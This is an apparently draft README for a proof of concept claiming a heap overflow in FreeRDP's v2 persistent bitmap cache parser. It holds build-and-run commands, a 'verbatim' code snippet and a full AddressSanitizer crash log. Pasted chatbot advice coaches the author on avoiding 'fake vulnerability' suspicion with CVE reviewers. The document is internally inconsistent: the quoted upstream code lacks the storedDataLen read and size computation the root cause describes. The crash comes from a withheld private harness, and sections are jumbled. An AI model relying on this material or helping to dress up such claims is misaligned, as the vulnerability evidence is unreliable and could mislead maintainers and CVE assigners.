# freerdp-persistent-cache-v2-heapoverflow
Repo name suggestion: freerdp‑persistent‑v2‑poc
Files in repo: gen_poc_v2.c, asan_crash_v2.txt, screenshot_asan.png(optional).
Do NOT push harness.c / standalone_persistent.c
# FreeRDP: Heap‑Based Buffer Overflow in persistent_cache_read_entry_v2
PoC for vulnerability in FreeRDP persistent bitmap cache parser.

## Vulnerability Information
- Component: `libfreerdp/cache/persistent.c`
- Function: `persistent_cache_read_entry_v2`
- CWE: **CWE‑122 Heap‑based Buffer Overflow**
- Impact: Parsing malicious persistent cache file can trigger heap overflow, potentially leading to arbitrary code execution.
- Affected: FreeRDP versions containing the `persistent_cache_read_entry_v2` code path.
- This calculation uses 32‑bit unsigned integer arithmetic with no 64‑bit overflow check.
Malicious width and height values trigger integer overflow, producing a very small buffer size for winpr_aligned_recalloc().
The input file provides an independent field storedDataLen, which is passed directly to fread() as read length.
Attacker‑controlled large storedDataLen causes far more bytes to be read into the small heap‑allocated buffer → heap buffer overflow.
Note: This bug only exists in the v2 entry parser. The v3 parser includes an explicit 64‑bit upper‑bound check and is not vulnerable.
PoC
gen_poc_v2.c: Malicious cache file generator, outputs poc_v2.bin.
asan_crash_v2.txt: Full raw AddressSanitizer crash log from reproduction.
screenshot_asan.png: Optional screenshot of ASan crash.
Reproduction Steps
gcc gen_poc_v2.c -o gen_poc_v2
./gen_poc_v2
This produces poc_v2.bin, the malicious persistent cache input file.
Local verification setup
A local standalone harness is required for testing.
The harness embeds unmodified original persistent_cache_read_entry_v2 function taken directly from FreeRDP upstream source.
This harness is for local verification only and not included in this repository.
Compile harness with AddressSanitizer
gcc -fsanitize=address -g standalone_persistent.c harness.c -o harness
./harness poc_v2.bin
AddressSanitizer will report heap‑buffer‑overflow inside fread().
Original Vulnerable Code Snippet
Extracted verbatim from FreeRDP upstream libfreerdp/cache/persistent.c:

static int persistent_cache_read_entry_v2(rdpPersistentCache* persistent,
                                          PERSISTENT_CACHE_ENTRY* entry)
{
	PERSISTENT_CACHE_ENTRY_V2 entry2 = WINPR_C_ARRAY_INIT;

	WINPR_ASSERT(persistent);
	WINPR_ASSERT(entry);

	if (fread(&entry2, sizeof(entry2), 1, persistent->fp) != 1)
		return -1;
	entry->key64 = entry2.key64;
	entry->width = entry2.width;   
	entry->height = entry2.height; 
	entry->flags = entry2.flags;

	if (!persist_cache_get_data(persistent, entry))
		return -1;

	if (fread(entry->data, 0x4000, 1, persistent->fp) != 1)
		return -1;

	return 1;
}



Notes
The vulnerability exists in unmodified upstream FreeRDP, no source‑code patches are needed to trigger.
This repository only provides PoC material for CVE application and vulnerability documentation.



### Key points for CVE reviewer
1. Explicitly says harness is local‑only and **not in repo**, avoids “fake vulnerability” suspicion.
2. Embeds original upstream vulnerable function.
3. Clearly distinguishes vulnerable v2 vs non‑vulnerable v3.
4. All reproduction steps are concrete.

You can copy‑paste this whole markdown directly into your GitHub README.md.
If you want, I can also give you the exact MITRE web‑form `Summary` / `Description` text block to copy‑paste.


## Root Cause
Inside `persistent_cache_read_entry_v2`:
```c
entry->size = entry2.width * entry2.height * 4;


ASAN crash log:
$ ./harness_v2 poc_v2.bin
[dbg-v2] w=3221225474 h=3 storedDataLen=187
[dbg-v2] 4*w*h overflow computed size = 0x18
[dbg-v2] realloc ptr=0x603000000040 newSize=24
[dbg-v2] will fread 187 bytes into 0x603000000040, buffer allocated size=24
=================================================================
==19774==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x603000000058 at pc 0x6507d84cab2e bp 0x7ffce4734e10 sp 0x7ffce47345e0
WRITE of size 187 at 0x603000000058 thread T0
    #0 0x6507d84cab2d in fread (/home/lloyd/Documents/FreeRDP-master/harness_v2+0x39b2d) (BuildId: a4592f5c496f776a16c232719988b224fd8201a7)
    #1 0x6507d856d628 in persistent_cache_read_entry_v2 /home/lloyd/Documents/FreeRDP-master/standalone_persistent_v2.c:66:9
    #2 0x6507d856cf02 in trigger_v2 /home/lloyd/Documents/FreeRDP-master/standalone_persistent_v2.c:87:15
    #3 0x6507d856d8ba in main /home/lloyd/Documents/FreeRDP-master/standalone_persistent_v2.c:99:12
    #4 0x7ff440c29d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #5 0x7ff440c29e3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #6 0x6507d84af314 in _start (/home/lloyd/Documents/FreeRDP-master/harness_v2+0x1e314) (BuildId: a4592f5c496f776a16c232719988b224fd8201a7)

0x603000000058 is located 0 bytes to the right of 24-byte region [0x603000000040,0x603000000058)
allocated by thread T0 here:
    #0 0x6507d8532586 in __interceptor_realloc (/home/lloyd/Documents/FreeRDP-master/harness_v2+0xa1586) (BuildId: a4592f5c496f776a16c232719988b224fd8201a7)
    #1 0x6507d856d8f4 in winpr_aligned_recalloc /home/lloyd/Documents/FreeRDP-master/standalone_persistent_v2.c:18:15
    #2 0x6507d856d466 in persistent_cache_read_entry_v2 /home/lloyd/Documents/FreeRDP-master/standalone_persistent_v2.c:55:26
    #3 0x6507d856cf02 in trigger_v2 /home/lloyd/Documents/FreeRDP-master/standalone_persistent_v2.c:87:15
    #4 0x6507d856d8ba in main /home/lloyd/Documents/FreeRDP-master/standalone_persistent_v2.c:99:12
    #5 0x7ff440c29d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/lloyd/Documents/FreeRDP-master/harness_v2+0x39b2d) (BuildId: a4592f5c496f776a16c232719988b224fd8201a7) in fread
Shadow bytes around the buggy address:
  0x0c067fff7fb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c067fff7fc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c067fff7fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c067fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c067fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c067fff8000: fa fa 00 00 00 fa fa fa 00 00 00[fa]fa fa fa fa
  0x0c067fff8010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c067fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c067fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c067fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c067fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==19774==ABORTING
lloyd@lloyd-Dell-G15-5

